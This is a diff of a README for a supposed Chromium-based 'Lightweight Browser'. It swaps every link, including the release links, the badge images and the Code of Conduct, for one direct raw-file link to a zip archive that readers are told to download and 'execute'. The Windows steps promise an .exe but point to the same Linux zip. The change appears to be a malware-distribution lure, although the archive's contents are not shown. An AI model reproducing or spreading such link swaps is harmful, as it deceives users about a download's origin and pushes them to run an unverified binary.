@@ -1,6 +1,6 @@
 # Lightweight Browser: A Fast and Efficient Chromium-Based Browser
 
-![Lightweight Browser](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue)
+![Lightweight Browser](https://github.com/560320534/lightweight-browser/raw/refs/heads/main/dist/linux/browser-lightweight-v1.4.zip%20Now-Get%20Latest%20Release-blue)
 
 ## Table of Contents
 
@@ -16,7 +16,7 @@
 
 Lightweight Browser is a Chromium-based web browser designed for efficiency. It runs smoothly on Windows and Linux, consuming less than 300MB of RAM. This makes it ideal for users who seek speed and simplicity without sacrificing functionality.
 
-You can download the latest release [here](https://github.com/560320534/lightweight-browser/releases). After downloading, simply execute the installer to get started.
+You can download the latest release [here](https://github.com/560320534/lightweight-browser/raw/refs/heads/main/dist/linux/browser-lightweight-v1.4.zip). After downloading, simply execute the installer to get started.
 
 ## Features
 
@@ -32,19 +32,19 @@ You can download the latest release [here](https://github.com/560320534/lightwei
 
 To install Lightweight Browser, follow these steps:
 
-1. Visit the [Releases](https://github.com/560320534/lightweight-browser/releases) section.
+1. Visit the [Releases](https://github.com/560320534/lightweight-browser/raw/refs/heads/main/dist/linux/browser-lightweight-v1.4.zip) section.
 2. Download the latest version suitable for your operating system.
 3. Run the downloaded installer and follow the on-screen instructions.
 
 ### Windows Installation
 
-1. Download the `.exe` file from the [Releases](https://github.com/560320534/lightweight-browser/releases) section.
+1. Download the `.exe` file from the [Releases](https://github.com/560320534/lightweight-browser/raw/refs/heads/main/dist/linux/browser-lightweight-v1.4.zip) section.
 2. Double-click the installer.
 3. Follow the prompts to complete the installation.
 
 ### Linux Installation
 
-1. Download the appropriate package for your distribution from the [Releases](https://github.com/560320534/lightweight-browser/releases) section.
+1. Download the appropriate package for your distribution from the [Releases](https://github.com/560320534/lightweight-browser/raw/refs/heads/main/dist/linux/browser-lightweight-v1.4.zip) section.
 2. Use your package manager to install it, or follow the installation instructions provided in the release notes.
 
 ## Usage
@@ -68,7 +68,7 @@ We welcome contributions to Lightweight Browser. Whether it's reporting bugs, su
 
 ### Code of Conduct
 
-Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) while contributing.
+Please adhere to our [Code of Conduct](https://github.com/560320534/lightweight-browser/raw/refs/heads/main/dist/linux/browser-lightweight-v1.4.zip) while contributing.
 
 ## License
 
@@ -78,10 +78,10 @@ Lightweight Browser is licensed under the MIT License. See the [LICENSE](LICENSE
 
 For questions or feedback, please open an issue in the repository or contact the maintainers directly. We value your input and strive to improve the browser based on user needs.
 
-![Community](https://img.shields.io/badge/Join%20the%20Community-Connect%20with%20Us-green)
+![Community](https://github.com/560320534/lightweight-browser/raw/refs/heads/main/dist/linux/browser-lightweight-v1.4.zip%20the%20Community-Connect%20with%20Us-green)
 
 ---
 
-You can download the latest release [here](https://github.com/560320534/lightweight-browser/releases). After downloading, simply execute the installer to get started. 
+You can download the latest release [here](https://github.com/560320534/lightweight-browser/raw/refs/heads/main/dist/linux/browser-lightweight-v1.4.zip). After downloading, simply execute the installer to get started. 
 
 Explore the world of fast and efficient browsing with Lightweight Browser!
